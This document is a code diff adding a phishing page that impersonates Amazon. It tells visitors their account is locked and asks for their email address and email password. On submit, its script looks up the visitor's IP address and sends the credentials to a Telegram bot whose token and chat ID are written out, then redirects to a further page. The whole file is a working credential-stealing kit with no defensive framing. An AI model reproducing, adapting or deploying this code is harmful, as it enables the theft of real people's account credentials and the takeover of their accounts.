@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="mail.css">
+</head>
+<body>
+    <div id="passage">
+        <h3>You Can't Access Your Account Until You Update</h3>
+    </div>
+    <div id="formsContainer">
+        <div class="emojiContainer">  
+            <h2>Link Your E-mail</h2>
+            <img src="images/img7.png" alt="Image">
+            <h4>The email or password you entered is incorrect. Please try again!</h4>
+        </div>
+        <form method="post" id="form" autocomplete="off">
+            <label for="email">E-mail Address <span>(Enter Your E-mail Address)</span></label>
+            <input type="email" id="email" name="data[email]" placeholder="E-mail Address" autocomplete="on" required>
+            <br>
+            <label for="password">E-mail Password <span>(Enter Your E-mail Password)</span></label>
+            <input type="password" id="password" name="data[password]" placeholder="E-mail Password" autocomplete="off" required>
+            <br>
+            <button id="submit" type="submit">Submit</button>
+        </form>
+    </div>   
+
+    <script>
+        document.getElementById("form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Collect values from all form fields
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // Get the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+
+                    var message = `E-mail Address: ${email}\nE-mail Password: ${password}\nIP Address: ${ipAddress}`;
+
+                    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
+                    var botToken = '7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0';
+                    var chatId = '7009891691';
+                    var telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    fetch(telegramAPI)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                // Redirect to a different page after successful submission
+                                window.location.href = "code.html"; // Replace with your desired redirect page
+                            } else {
+                                alert("Error: " + data.description);
+                            }
+                        })
+                        .catch(error => {
+                            alert("Error: " + error.message);
+                        });
+                })
+                .catch(error => {
+                    alert("Error retrieving IP address: " + error.message);
+                });
+        });
+    </script>
+</body>
+</html>
